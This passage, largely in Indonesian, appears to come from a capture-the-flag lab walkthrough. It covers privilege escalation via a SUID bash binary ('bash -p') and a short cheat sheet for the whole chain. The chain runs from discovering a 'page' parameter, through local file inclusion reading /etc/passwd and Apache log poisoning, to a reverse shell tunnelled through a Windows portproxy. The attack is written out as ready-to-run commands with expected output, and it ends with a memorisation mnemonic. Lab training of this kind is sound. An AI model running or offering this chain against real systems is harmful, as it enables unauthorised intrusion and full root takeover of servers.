/usr/bin/bash -p
id
whoami
```

Expected:

```text
/usr/bin/bash
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
```

---

## 12. Root Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /root/flag.txt
```

Expected:

```text
FLAG{r00t_v1a_su1d_bash_8f3b1d60}
```

---

## Cheat Sheet Paling Pendek

### PowerShell Administrator

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=12345 connectaddress=172.26.59.55 connectport=12345
New-NetFirewallRule -DisplayName "WSL Listener 12345" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 12345 -RemoteAddress 192.168.56.0/24
```

### WSL

```bash
TARGET="192.168.56.13"
BASE="http://$TARGET:8081"

nmap -sC -sV "$TARGET"
arjun -u "$BASE"
# Expected: Parameters found: page
curl -s "$BASE/?page=../../../../etc/passwd" | grep -E 'root:|petugas:'

cd ~/Downloads
python3 -m venv .venv
source .venv/bin/activate
python -m pip install requests paramiko
sudo fuser -k 12345/tcp 2>/dev/null

python lfi2rce \
  -u "$BASE/?page=" \
  -t apache-lin \
  -r 192.168.56.1 \
  -p 12345
```

### Setelah Shell Masuk

```bash
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash

find / -type f -iname "*flag*" 2>/dev/null
cat /home/petugas/flag.txt

find / -perm -4000 -type f 2>/dev/null
/usr/bin/bash -p
id
whoami
cat /root/flag.txt
```

---

# Alur Hafalan Akhir

```text
DISCOVER → ENUMERATE → ARJUN PAGE → LFI → PASSWD → WSL PORTPROXY → LOG POISON → WWW-DATA → USER FLAG → SUID BASH → BASH -P → ROOT FLAG
```

## Mnemonic

```text
S.I.P.A.D.U

S = Scan jaringan dan service
I = Identify parameter `page` dengan Arjun, lalu include `/etc/passwd`
P = Poison Apache access.log
A = Access shell sebagai www-data
D = Discover SUID /usr/bin/bash
U = Upgrade privilege dengan bash -p
```
